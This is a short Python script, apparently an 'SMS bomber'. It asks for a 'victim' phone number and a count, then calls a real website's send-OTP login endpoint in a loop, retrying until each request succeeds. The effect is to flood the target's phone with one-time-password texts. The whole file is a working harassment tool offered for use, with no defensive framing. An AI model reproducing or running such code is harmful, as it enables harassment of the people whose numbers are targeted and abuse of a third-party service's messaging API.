logo=str(""" ___ __ __   ______              ________      
/__//_//_/\ /_____/\            /_______/\     
\::\| \| \ \\:::_ \ \    _______\::: _  \ \    
 \:.      \ \\:(_) ) )_ /______/\\::(_)  \ \   
  \:.\-/\  \ \\: __ `\ \\__::::\/ \:: __  \ \  
   \. \  \  \ \\ \ `\ \ \          \:.\ \  \ \ 
    \__\/ \__\/ \_\/ \_\/           \__\/\__\/ """)



import requests

print(logo)

number=str(input(" Enter The Victm Number : "))

amount=int(input(" Enter The Amount : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

print("\n\n")
for i in range(amount):
	while True:
		req=requests.get(api)
		if req.status_code==200:
			print("\n\t✅ "+str(i+1)+" SMS Sent ✅\n")
			break
		else:
			print("\t❌ SMS Not Send ❌")
